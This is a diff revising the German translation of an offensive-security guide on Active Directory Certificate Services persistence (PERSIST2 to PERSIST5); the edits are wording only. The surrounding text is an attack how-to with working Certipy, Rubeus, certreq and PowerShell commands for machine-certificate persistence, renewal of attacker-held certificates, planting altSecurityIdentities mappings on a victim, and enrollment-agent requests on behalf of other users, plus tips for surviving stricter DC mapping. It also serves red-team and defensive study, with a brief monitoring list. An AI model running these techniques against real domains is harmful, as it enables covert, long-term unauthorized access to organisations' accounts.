@@ -34,7 +34,7 @@ certipy auth -pfx user.pfx -dc-ip 10.0.0.10
 ```
 > Hinweis: In Kombination mit anderen Techniken (siehe THEFT-Abschnitte) ermöglicht die zertifikatsbasierte Authentifizierung einen dauerhaften Zugriff, ohne LSASS zu berühren und sogar aus nicht erhöhten Kontexten.
 
-## Maschinenpersistenz mit Zertifikaten erlangen - PERSIST2
+## Erreichen von Maschinenpersistenz mit Zertifikaten - PERSIST2
 
 Wenn ein Angreifer erhöhte Berechtigungen auf einem Host hat, kann er das Maschinenkonto des kompromittierten Systems mit dem Standard-`Machine`-Template für ein Zertifikat registrieren. Die Authentifizierung als Maschine ermöglicht S4U2Self für lokale Dienste und kann eine dauerhafte Maschinenpersistenz bieten:
 ```bash
@@ -46,7 +46,7 @@ Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0
 ```
 ## Extending Persistence Through Certificate Renewal - PERSIST3
 
-Das Ausnutzen der Gültigkeits- und Erneuerungszeiträume von Zertifikatvorlagen ermöglicht es einem Angreifer, langfristigen Zugriff zu behalten. Wenn Sie ein zuvor ausgestelltes Zertifikat und dessen privaten Schlüssel besitzen, können Sie es vor Ablauf erneuern, um ein frisches, langlebiges Credential zu erhalten, ohne zusätzliche Anforderungsartefakte, die mit dem ursprünglichen Prinzipal verbunden sind, zu hinterlassen.
+Der Missbrauch der Gültigkeits- und Erneuerungszeiträume von Zertifikatvorlagen ermöglicht es einem Angreifer, langfristigen Zugriff zu behalten. Wenn Sie ein zuvor ausgestelltes Zertifikat und dessen privaten Schlüssel besitzen, können Sie es vor Ablauf erneuern, um ein frisches, langlebiges Credential zu erhalten, ohne zusätzliche Anforderungsartefakte zu hinterlassen, die mit dem ursprünglichen Prinzipal verbunden sind.
 ```bash
 # Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
 # Provide the existing PFX and target the same CA/template when possible
@@ -57,7 +57,7 @@ certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
 # (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
 certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
 ```
-> Betrieblicher Tipp: Verfolgen Sie die Laufzeiten von von Angreifern gehaltenen PFX-Dateien und erneuern Sie diese frühzeitig. Die Erneuerung kann auch dazu führen, dass aktualisierte Zertifikate die moderne SID-Mapping-Erweiterung enthalten, wodurch sie unter strengeren DC-Mapping-Regeln verwendbar bleiben (siehe nächster Abschnitt).
+> Betrieblicher Tipp: Verfolgen Sie die Laufzeiten von von Angreifern gehaltenen PFX-Dateien und erneuern Sie diese frühzeitig. Eine Erneuerung kann auch dazu führen, dass aktualisierte Zertifikate die moderne SID-Mapping-Erweiterung enthalten, wodurch sie unter strengeren DC-Mapping-Regeln verwendbar bleiben (siehe nächster Abschnitt).
 
 ## Pflanzung expliziter Zertifikat-Mappings (altSecurityIdentities) – PERSIST4
 
@@ -67,10 +67,10 @@ Hochrangiger Ablauf:
 
 1. Erhalten oder stellen Sie ein Client-Auth-Zertifikat aus, das Sie kontrollieren (z. B. melden Sie sich mit der `User`-Vorlage als sich selbst an).
 2. Extrahieren Sie einen starken Identifikator aus dem Zertifikat (Issuer+Serial, SKI oder SHA1-PublicKey).
-3. Fügen Sie eine explizite Zuordnung im `altSecurityIdentities` des Opferprinzips unter Verwendung dieses Identifikators hinzu.
+3. Fügen Sie eine explizite Zuordnung im `altSecurityIdentities` des Opfers mit diesem Identifikator hinzu.
 4. Authentifizieren Sie sich mit Ihrem Zertifikat; der DC ordnet es über die explizite Zuordnung dem Opfer zu.
 
-Beispiel (PowerShell) unter Verwendung einer starken Issuer+Serial-Zuordnung:
+Beispiel (PowerShell) mit einer starken Issuer+Serial-Zuordnung:
 ```powershell
 # Example values - reverse the issuer DN and serial as required by AD mapping format
 $Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
@@ -85,7 +85,7 @@ Dann authentifizieren Sie sich mit Ihrem PFX. Certipy wird ein TGT direkt abrufe
 certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10
 ```
 Notizen
-- Verwenden Sie nur starke Zuordnungstypen: X509IssuerSerialNumber, X509SKI oder X509SHA1PublicKey. Schwache Formate (Subject/Issuer, nur Subject, RFC822-E-Mail) sind veraltet und können durch die DC-Richtlinie blockiert werden.
+- Verwenden Sie nur starke Mapping-Typen: X509IssuerSerialNumber, X509SKI oder X509SHA1PublicKey. Schwache Formate (Subject/Issuer, nur Subject, RFC822-E-Mail) sind veraltet und können durch die DC-Richtlinie blockiert werden.
 - Die Zertifikatskette muss zu einem von der DC vertrauenswürdigen Root führen. Unternehmens-CAs in NTAuth sind typischerweise vertrauenswürdig; einige Umgebungen vertrauen auch öffentlichen CAs.
 
 Für weitere Informationen zu schwachen expliziten Zuordnungen und Angriffswegen siehe:
@@ -109,22 +109,22 @@ Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
 certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
 -template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
 ```
-Die Widerrufung des Agentenzertifikats oder der Vorlagenberechtigungen ist erforderlich, um diese Persistenz zu beseitigen.
+Die Widerrufung des Agentenzertifikats oder der Berechtigungen für Vorlagen ist erforderlich, um diese Persistenz zu beseitigen.
 
-## 2025 Starke Zertifikatzuordnungsdurchsetzung: Auswirkungen auf die Persistenz
+## 2025 Starke Durchsetzung der Zertifikatzuordnung: Auswirkungen auf die Persistenz
 
-Microsoft KB5014754 führte die starke Zertifikatzuordnungsdurchsetzung auf Domänencontrollern ein. Seit dem 11. Februar 2025 verwenden DCs standardmäßig die vollständige Durchsetzung und lehnen schwache/mehrdeutige Zuordnungen ab. Praktische Auswirkungen:
+Microsoft KB5014754 führte die starke Durchsetzung der Zertifikatzuordnung auf Domänencontrollern ein. Seit dem 11. Februar 2025 verwenden DCs standardmäßig die vollständige Durchsetzung und lehnen schwache/mehrdeutige Zuordnungen ab. Praktische Auswirkungen:
 
-- Zertifikate vor 2022, die die SID-Zuordnungs-Erweiterung nicht haben, können bei DCs in vollständiger Durchsetzung die implizite Zuordnung fehlschlagen. Angreifer können den Zugriff aufrechterhalten, indem sie entweder Zertifikate über AD CS erneuern (um die SID-Erweiterung zu erhalten) oder eine starke explizite Zuordnung in `altSecurityIdentities` (PERSIST4) einfügen.
+- Zertifikate vor 2022, die die SID-Zuordnungs-Erweiterung nicht haben, können bei vollständiger Durchsetzung durch DCs an der impliziten Zuordnung scheitern. Angreifer können den Zugriff aufrechterhalten, indem sie entweder Zertifikate über AD CS erneuern (um die SID-Erweiterung zu erhalten) oder eine starke explizite Zuordnung in `altSecurityIdentities` (PERSIST4) einfügen.
 - Explizite Zuordnungen mit starken Formaten (Issuer+Serial, SKI, SHA1-PublicKey) funktionieren weiterhin. Schwache Formate (Issuer/Subject, nur Subject, RFC822) können blockiert werden und sollten für die Persistenz vermieden werden.
 
 Administratoren sollten überwachen und alarmieren bei:
 - Änderungen an `altSecurityIdentities` und der Ausstellung/Erneuerung von Enrollment-Agent- und Benutzerzertifikaten.
-- CA-Ausgabelogs für Anfragen im Namen von und ungewöhnliche Erneuerungsmuster.
+- CA-Ausgabeverzeichnissen für Anfragen im Namen von und ungewöhnliche Erneuerungsmuster.
 
 ## Referenzen
 
-- Microsoft. KB5014754: Änderungen der zertifikatbasierten Authentifizierung auf Windows-Domänencontrollern (Durchsetzungszeitplan und starke Zuordnungen).
+- Microsoft. KB5014754: Änderungen bei der zertifikatbasierten Authentifizierung auf Windows-Domänencontrollern (Durchsetzungszeitplan und starke Zuordnungen).
 https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
 - Certipy Wiki – Befehlsreferenz (`req -renew`, `auth`, `shadow`).
 https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
